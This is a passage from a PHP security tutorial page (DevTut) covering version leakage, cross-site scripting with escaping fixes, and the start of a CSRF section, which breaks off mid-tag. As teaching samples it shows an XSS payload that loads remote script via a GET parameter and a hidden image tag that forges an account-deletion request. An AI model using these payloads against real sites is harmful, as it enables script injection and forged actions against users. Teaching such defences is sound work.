<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>PHP - Security</title>
    <meta name="generator" content="VuePress 1.8.2">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
    <meta name="description" content="PHP Version Leakage, Cross-Site Scripting (XSS), Cross-Site Request Forgery, Command Line Injection, Error Reporting, File Inclusion, Stripping Tags, Uploading files">
    <meta property="og:site_name" content="DevTut">
    <meta property="og:title" content="PHP - Security">
    <meta property="og:description" content="PHP Version Leakage, Cross-Site Scripting (XSS), Cross-Site Request Forgery, Command Line Injection, Error Reporting, File Inclusion, Stripping Tags, Uploading files">
    <meta property="og:type" content="article">
    <meta property="og:url" content="/php/security.html">
    <meta property="og:image" content="/logo.png">
    <meta name="twitter:title" content="PHP - Security">
    <meta name="twitter:description" content="PHP Version Leakage, Cross-Site Scripting (XSS), Cross-Site Request Forgery, Command Line Injection, Error Reporting, File Inclusion, Stripping Tags, Uploading files">
    <meta name="twitter:url" content="/php/security.html">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="/logo.png">
    <meta name="theme-color" content="#ffffff">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="msapplication-TileImage" content="/mstile-150x150.png">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="google-site-verification" content="76_rKXgwMVIjd-axJC_1zPV9OS4mEjvtgjYOWVkAdnQ">
    
    <link rel="preload" href="/assets/css/0.styles.60619e34.css" as="style"><link rel="preload" href="/assets/js/app.1779e102.js" as="script"><link rel="preload" href="/assets/js/3.2cfa8016.js" as="script"><link rel="preload" href="/assets/js/2503.2291e032.js" as="script">
    <link rel="stylesheet" href="/assets/css/0.styles.60619e34.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">DevTut</span></a> <div class="links"><form id="search-form" role="search" class="algolia-search-wrapper search-box"><input id="algolia-search-input" class="search-query"></form> <nav class="nav-links can-hide"> <a href="https://github.com/devtut/generate" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"> <a href="https://github.com/devtut/generate" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>PHP</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/php/" aria-current="page" class="sidebar-link">Disclaimer</a></li><li><a href="/php/installing-a-php-environment-on-windows.html" class="sidebar-link">Installing a PHP environment on Windows</a></li><li><a href="/php/installing-on-linux-unix-environments.html" class="sidebar-link">Installing on Linux/Unix Environments</a></li><li><a href="/php/getting-started-with-php.html" class="sidebar-link">Getting started with PHP</a></li><li><a href="/php/variables.html" class="sidebar-link">Variables</a></li><li><a href="/php/variable-scope.html" class="sidebar-link">Variable Scope</a></li><li><a href="/php/superglobal-variables-php.html" class="sidebar-link">Superglobal Variables PHP</a></li><li><a href="/php/outputting-the-value-of-a-variable.html" class="sidebar-link">Outputting the Value of a Variable</a></li><li><a href="/php/constants.html" class="sidebar-link">Constants</a></li><li><a href="/php/magic-constants.html" class="sidebar-link">Magic Constants</a></li><li><a href="/php/comments.html" class="sidebar-link">Comments</a></li><li><a href="/php/types.html" class="sidebar-link">Types</a></li><li><a href="/php/operators.html" class="sidebar-link">Operators</a></li><li><a href="/php/references.html" class="sidebar-link">References</a></li><li><a href="/php/arrays.html" class="sidebar-link">Arrays</a></li><li><a href="/php/array-iteration.html" class="sidebar-link">Array iteration</a></li><li><a href="/php/executing-upon-an-array.html" class="sidebar-link">Executing Upon an Array</a></li><li><a href="/php/manipulating-an-array.html" class="sidebar-link">Manipulating an Array</a></li><li><a href="/php/processing-multiple-arrays-together.html" class="sidebar-link">Processing Multiple Arrays Together</a></li><li><a href="/php/datetime-class.html" class="sidebar-link">Datetime Class</a></li><li><a href="/php/working-with-dates-and-time.html" class="sidebar-link">Working with Dates and Time</a></li><li><a href="/php/control-structures.html" class="sidebar-link">Control Structures</a></li><li><a href="/php/loops.html" class="sidebar-link">Loops</a></li><li><a href="/php/functions.html" class="sidebar-link">Functions</a></li><li><a href="/php/functional-programming.html" class="sidebar-link">Functional Programming</a></li><li><a href="/php/alternative-syntax-for-control-structures.html" class="sidebar-link">Alternative Syntax for Control Structures</a></li><li><a href="/php/string-formatting.html" class="sidebar-link">String formatting</a></li><li><a href="/php/string-parsing.html" class="sidebar-link">String Parsing</a></li><li><a href="/php/classes-and-objects.html" class="sidebar-link">Classes and Objects</a></li><li><a href="/php/namespaces.html" class="sidebar-link">Namespaces</a></li><li><a href="/php/sessions.html" class="sidebar-link">Sessions</a></li><li><a href="/php/cookies.html" class="sidebar-link">Cookies</a></li><li><a href="/php/output-buffering.html" class="sidebar-link">Output Buffering</a></li><li><a href="/php/json.html" class="sidebar-link">JSON</a></li><li><a href="/php/soap-client.html" class="sidebar-link">SOAP Client</a></li><li><a href="/php/using-curl-in-php.html" class="sidebar-link">Using cURL in PHP</a></li><li><a href="/php/reflection.html" class="sidebar-link">Reflection</a></li><li><a href="/php/dependency-injection.html" class="sidebar-link">Dependency Injection</a></li><li><a href="/php/xml.html" class="sidebar-link">XML</a></li><li><a href="/php/simplexml.html" class="sidebar-link">SimpleXML</a></li><li><a href="/php/parsing-html.html" class="sidebar-link">Parsing HTML</a></li><li><a href="/php/regular-expressions-regexp-pcre.html" class="sidebar-link">Regular Expressions (regexp/PCRE)</a></li><li><a href="/php/traits.html" class="sidebar-link">Traits</a></li><li><a href="/php/composer-dependency-manager.html" class="sidebar-link">Composer Dependency Manager</a></li><li><a href="/php/magic-methods.html" class="sidebar-link">Magic Methods</a></li><li><a href="/php/file-handling.html" class="sidebar-link">File handling</a></li><li><a href="/php/streams.html" class="sidebar-link">Streams</a></li><li><a href="/php/type-hinting.html" class="sidebar-link">Type hinting</a></li><li><a href="/php/filters-filter-functions.html" class="sidebar-link">Filters &amp; Filter Functions</a></li><li><a href="/php/generators.html" class="sidebar-link">Generators</a></li><li><a href="/php/utf-8.html" class="sidebar-link">UTF-8</a></li><li><a href="/php/how-to-break-down-an-url.html" class="sidebar-link">How to break down an URL</a></li><li><a href="/php/object-serialization.html" class="sidebar-link">Object Serialization</a></li><li><a href="/php/serialization.html" class="sidebar-link">Serialization</a></li><li><a href="/php/closure.html" class="sidebar-link">Closure</a></li><li><a href="/php/reading-request-data.html" class="sidebar-link">Reading Request Data</a></li><li><a href="/php/type-juggling-and-non-strict-comparison-issues.html" class="sidebar-link">Type juggling and Non-Strict Comparison Issues</a></li><li><a href="/php/sockets.html" class="sidebar-link">Sockets</a></li><li><a href="/php/pdo.html" class="sidebar-link">PDO</a></li><li><a href="/php/php-mysqli.html" class="sidebar-link">PHP MySQLi</a></li><li><a href="/php/sqlite3.html" class="sidebar-link">SQLite3</a></li><li><a href="/php/using-mongodb.html" class="sidebar-link">Using MongoDB</a></li><li><a href="/php/mongo-php.html" class="sidebar-link">mongo-php</a></li><li><a href="/php/using-redis-with-php.html" class="sidebar-link">Using Redis with PHP</a></li><li><a href="/php/sending-email.html" class="sidebar-link">Sending Email</a></li><li><a href="/php/using-sqlsrv.html" class="sidebar-link">Using SQLSRV</a></li><li><a href="/php/command-line-interface-cli.html" class="sidebar-link">Command Line Interface (CLI)</a></li><li><a href="/php/localization.html" class="sidebar-link">Localization</a></li><li><a href="/php/headers-manipulation.html" class="sidebar-link">Headers Manipulation</a></li><li><a href="/php/coding-conventions.html" class="sidebar-link">Coding Conventions</a></li><li><a href="/php/asynchronous-programming.html" class="sidebar-link">Asynchronous programming</a></li><li><a href="/php/how-to-detect-client-ip-address.html" class="sidebar-link">How to Detect Client IP Address</a></li><li><a href="/php/create-pdf-files-in-php.html" class="sidebar-link">Create PDF files in PHP</a></li><li><a href="/php/yaml-in-php.html" class="sidebar-link">YAML in PHP</a></li><li><a href="/php/image-processing-with-gd.html" class="sidebar-link">Image Processing with GD</a></li><li><a href="/php/imagick.html" class="sidebar-link">Imagick</a></li><li><a href="/php/soap-server.html" class="sidebar-link">SOAP Server</a></li><li><a href="/php/machine-learning.html" class="sidebar-link">Machine learning</a></li><li><a href="/php/cache.html" class="sidebar-link">Cache</a></li><li><a href="/php/autoloading-primer.html" class="sidebar-link">Autoloading Primer</a></li><li><a href="/php/spl-data-structures.html" class="sidebar-link">SPL data structures</a></li><li><a href="/php/imap.html" class="sidebar-link">IMAP</a></li><li><a href="/php/http-authentication.html" class="sidebar-link">HTTP Authentication</a></li><li><a href="/php/websockets.html" class="sidebar-link">WebSockets</a></li><li><a href="/php/bc-math-binary-calculator.html" class="sidebar-link">BC Math (Binary Calculator)</a></li><li><a href="/php/docker-deployment.html" class="sidebar-link">Docker deployment</a></li><li><a href="/php/apcu.html" class="sidebar-link">APCu</a></li><li><a href="/php/php-built-in-server.html" class="sidebar-link">PHP Built in server</a></li><li><a href="/php/psr.html" class="sidebar-link">PSR</a></li><li><a href="/php/phpdoc.html" class="sidebar-link">PHPDoc</a></li><li><a href="/php/design-patterns.html" class="sidebar-link">Design Patterns</a></li><li><a href="/php/compile-php-extensions.html" class="sidebar-link">Compile PHP Extensions</a></li><li><a href="/php/common-errors.html" class="sidebar-link">Common Errors</a></li><li><a href="/php/compilation-of-errors-and-warnings.html" class="sidebar-link">Compilation of Errors and Warnings</a></li><li><a href="/php/exception-handling-and-error-reporting.html" class="sidebar-link">Exception Handling and Error Reporting</a></li><li><a href="/php/debugging.html" class="sidebar-link">Debugging</a></li><li><a href="/php/unit-testing.html" class="sidebar-link">Unit Testing</a></li><li><a href="/php/performance.html" class="sidebar-link">Performance</a></li><li><a href="/php/multiprocessing.html" class="sidebar-link">Multiprocessing</a></li><li><a href="/php/multi-threading-extension.html" class="sidebar-link">Multi Threading Extension</a></li><li><a href="/php/secure-remeber-me.html" class="sidebar-link">Secure Remeber Me</a></li><li><a href="/php/security.html" aria-current="page" class="active sidebar-link">Security</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/php/security.html#php-version-leakage" class="sidebar-link">PHP Version Leakage</a></li><li class="sidebar-sub-header"><a href="/php/security.html#cross-site-scripting-xss" class="sidebar-link">Cross-Site Scripting (XSS)</a></li><li class="sidebar-sub-header"><a href="/php/security.html#cross-site-request-forgery" class="sidebar-link">Cross-Site Request Forgery</a></li><li class="sidebar-sub-header"><a href="/php/security.html#command-line-injection" class="sidebar-link">Command Line Injection</a></li><li class="sidebar-sub-header"><a href="/php/security.html#error-reporting" class="sidebar-link">Error Reporting</a></li><li class="sidebar-sub-header"><a href="/php/security.html#file-inclusion" class="sidebar-link">File Inclusion</a></li><li class="sidebar-sub-header"><a href="/php/security.html#stripping-tags" class="sidebar-link">Stripping Tags</a></li><li class="sidebar-sub-header"><a href="/php/security.html#uploading-files" class="sidebar-link">Uploading files</a></li></ul></li><li><a href="/php/cryptography.html" class="sidebar-link">Cryptography</a></li><li><a href="/php/password-hashing-functions.html" class="sidebar-link">Password Hashing Functions</a></li><li><a href="/php/urls.html" class="sidebar-link">URLs</a></li><li><a href="/php/unicode-support-in-php.html" class="sidebar-link">Unicode Support in PHP</a></li><li><a href="/php/getting-started-with-php-7.html" class="sidebar-link">Getting started with php-7</a></li><li><a href="/php/null-coalesce-operator.html" class="sidebar-link">Null Coalesce Operator</a></li><li><a href="/php/spaceship-operator.html" class="sidebar-link">Spaceship operator</a></li><li><a href="/php/anonymous-class.html" class="sidebar-link">Anonymous class</a></li><li><a href="/php/contributing-to-the-php-manual.html" class="sidebar-link">Contributing to the PHP Manual</a></li><li><a href="/php/contributing-to-the-php-core.html" class="sidebar-link">Contributing to the PHP Core</a></li><li><a href="/php/getting-started-with-composer-php.html" class="sidebar-link">Getting started with composer-php</a></li><li><a href="/php/auto-loading-with-composer.html" class="sidebar-link">Auto loading with composer</a></li><li><a href="/php/how-to-use-private-repositories-with-composer.html" class="sidebar-link">How to use private repositories with Composer</a></li><li><a href="/php/getting-started-with-phpunit.html" class="sidebar-link">Getting Started with PHPUnit</a></li><li><a href="/php/assertions.html" class="sidebar-link">Assertions</a></li><li><a href="/php/test-doubles-mocks-and-stubs.html" class="sidebar-link">Test Doubles (Mocks and Stubs)</a></li><li><a href="/php/recipes.html" class="sidebar-link">Recipes</a></li><li><a href="/php/php-mysqli-affected-rows-returns-0-when-it-should-return-a-positive-integer.html" class="sidebar-link">php mysqli affected rows returns 0 when it should return a positive integer</a></li><li><a href="/php/contributors.html" class="sidebar-link">The Contributors</a></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="security"><a href="#security" class="header-anchor">#</a> Security</h1> <p>As the majority of websites run off PHP, application security is an important topic for PHP developers to protect their website, data, and clients. This topic covers best security practices in PHP as well as common vulnerabilities and weaknesses with example fixes in PHP.</p> <h2 id="php-version-leakage"><a href="#php-version-leakage" class="header-anchor">#</a> PHP Version Leakage</h2> <p>By default, PHP will tell the world what version of PHP you are using, e.g.</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token constant">X</span><span class="token operator">-</span>Powered<span class="token operator">-</span>By<span class="token punctuation">:</span> <span class="token constant">PHP</span><span class="token operator">/</span><span class="token number">5.3</span><span class="token number">.8</span>

</code></pre></div><p>To fix this you can either change php.ini:</p> <div class="language-php extra-class"><pre class="language-php"><code>expose_php <span class="token operator">=</span> off

</code></pre></div><p>Or change the header:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;X-Powered-By: Magic&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre></div><p>Or if you'd prefer a htaccess method:</p> <div class="language-php extra-class"><pre class="language-php"><code>Header <span class="token keyword">unset</span> <span class="token constant">X</span><span class="token operator">-</span>Powered<span class="token operator">-</span>By

</code></pre></div><p>If either of the above methods do not work, there is also the <a href="http://php.net/header_remove" target="_blank" rel="noopener noreferrer"><code>header_remove()</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> function that provides you the ability to remove the header:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token function">header_remove</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'X-Powered-By'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre></div><p>If attackers know that you are using PHP and the version of PHP that you are using, it's easier for them to exploit your server.</p> <h2 id="cross-site-scripting-xss"><a href="#cross-site-scripting-xss" class="header-anchor">#</a> Cross-Site Scripting (XSS)</h2> <h3 id="problem"><a href="#problem" class="header-anchor">#</a> Problem</h3> <p>Cross-site scripting is the unintended execution of remote code by a web client.  Any web application might expose itself to XSS if it takes input from a user and outputs it directly on a web page.  If input includes HTML or JavaScript, remote code can be executed when this content is rendered by the web client.</p> <p>For example, if a 3rd party side contains a <a href="http://stackoverflow.com/documentation/javascript/231/promises/846/introduction#t=201607242111378436991" target="_blank" rel="noopener noreferrer">JavaScript<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> file:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token comment">// http://example.com/runme.js</span>
document<span class="token operator">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;I'm running&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre></div><p>And a PHP application directly outputs a string passed into it:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div&gt;'</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/div&gt;'</span><span class="token punctuation">;</span>

</span></code></pre></div><p>If an unchecked GET parameter contains <code>&lt;script src=&quot;http://example.com/runme.js&quot;&gt;&lt;/script&gt;</code> then the output of the PHP script will be:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string double-quoted-string">&quot;http://example.com/runme.js&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>

</code></pre></div><p>The 3rd party JavaScript will run and the user will see &quot;I'm running&quot; on the web page.</p> <h3 id="solution"><a href="#solution" class="header-anchor">#</a> Solution</h3> <p>As a general rule, never trust input coming from a client.  Every GET, POST, and cookie value could be anything at all, and should therefore be validated.  When outputting any of these values, escape them so they will not be evaluated in an unexpected way.</p> <p>Keep in mind that even in the simplest applications data can be moved around and it will be hard to keep track of all sources.  Therefore it is a best practice to <strong>always</strong> escape output.</p> <p>PHP provides a few ways to escape output depending on the context.</p> <h3 id="filter-functions"><a href="#filter-functions" class="header-anchor">#</a> Filter Functions</h3> <p><a href="http://php.net/manual/en/ref.filter.php" target="_blank" rel="noopener noreferrer">PHPs Filter Functions<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> allow the input data to the php script to be <a href="http://php.net/manual/en/filter.filters.sanitize.php" target="_blank" rel="noopener noreferrer">sanitized<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> or <a href="http://php.net/manual/en/filter.filters.validate.php" target="_blank" rel="noopener noreferrer">validated<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> in <a href="http://php.net/manual/en/filter.filters.php" target="_blank" rel="noopener noreferrer">many ways<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>. They are useful when saving or outputting client input.</p> <h3 id="html-encoding"><a href="#html-encoding" class="header-anchor">#</a> HTML Encoding</h3> <p><code>htmlspecialchars</code> will convert any &quot;HTML special characters&quot; into their HTML encodings, meaning they will then <strong>not</strong> be processed as standard HTML.  To fix our previous example using this method:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div&gt;'</span> <span class="token operator">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/div&gt;'</span><span class="token punctuation">;</span>
<span class="token comment">// or</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div&gt;'</span> <span class="token operator">.</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_GET</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'input'</span><span class="token punctuation">,</span> <span class="token constant">FILTER_SANITIZE_SPECIAL_CHARS</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/div&gt;'</span><span class="token punctuation">;</span>

</span></code></pre></div><p>Would output:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span class="token operator">&amp;</span>lt<span class="token punctuation">;</span>script src<span class="token operator">=</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>http<span class="token punctuation">:</span><span class="token comment">//example.com/runme.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/div&gt;</span>

</code></pre></div><p>Everything inside the <code>&lt;div&gt;</code> tag will <strong>not</strong> be interpreted as a JavaScript tag by the browser, but instead as a simple text node. The user will safely see:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string double-quoted-string">&quot;http://example.com/runme.js&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>

</code></pre></div><h3 id="url-encoding"><a href="#url-encoding" class="header-anchor">#</a> URL Encoding</h3> <p>When outputting a dynamically generated URL, PHP provides the <code>urlencode</code> function to safely output valid URLs.  So, for example, if a user is able to input data that becomes part of another GET parameter:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// or</span>
<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_GET</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'input'</span><span class="token punctuation">,</span> <span class="token constant">FILTER_SANITIZE_URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href=&quot;http://example.com/page?input=&quot;'</span> <span class="token operator">.</span> <span class="token variable">$input</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&quot;&gt;Link&lt;/a&gt;'</span><span class="token punctuation">;</span>

</span></code></pre></div><p>Any malicious input will be converted to an encoded URL parameter.</p> <h3 id="using-specialised-external-libraries-or-owasp-antisamy-lists"><a href="#using-specialised-external-libraries-or-owasp-antisamy-lists" class="header-anchor">#</a> Using specialised external libraries or OWASP AntiSamy lists</h3> <p>Sometimes you will want to send HTML or other kind of code inputs. You will need to maintain a list of authorised words (white list) and un-authorized (blacklist).</p> <p>You can download standard lists available at the <a href="https://www.owasp.org/index.php/Category:OWASP_AntiSamy_Project" target="_blank" rel="noopener noreferrer">OWASP AntiSamy website<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>. Each list is fit for a specific kind of interaction (ebay api, tinyMCE, etc...). And it is open source.</p> <p>There are libraries existing to filter HTML and prevent XSS attacks for the general case and performing at least as well as AntiSamy lists with very easy use.
For example you have <a href="http://htmlpurifier.org/" target="_blank" rel="noopener noreferrer">HTML Purifier<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h2 id="cross-site-request-forgery"><a href="#cross-site-request-forgery" class="header-anchor">#</a> Cross-Site Request Forgery</h2> <h3 id="problem-2"><a href="#problem-2" class="header-anchor">#</a> Problem</h3> <p>Cross-Site Request Forgery or <code>CSRF</code> can force an end user to unknowingly generate malicious requests to a web server. This attack vector can be exploited in both POST and GET requests. Let's say for example the url endpoint <code>/delete.php?accnt=12</code> deletes account as passed from <code>accnt</code> parameter of a GET request. Now if an authenticated user will encounter the following script in any other application</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string double-quoted-string">&quot;http://domain.com/delete.php?accnt=12&quot;</span> width<span class="token operator">=</span><span class="token string double-quoted-string">&quot;0&quot;</span> height<span class="token operator">=</span><span class="token string double-quoted-string">&quot;0&quot;</span> border<span class="token operator">=</span><span class="token string 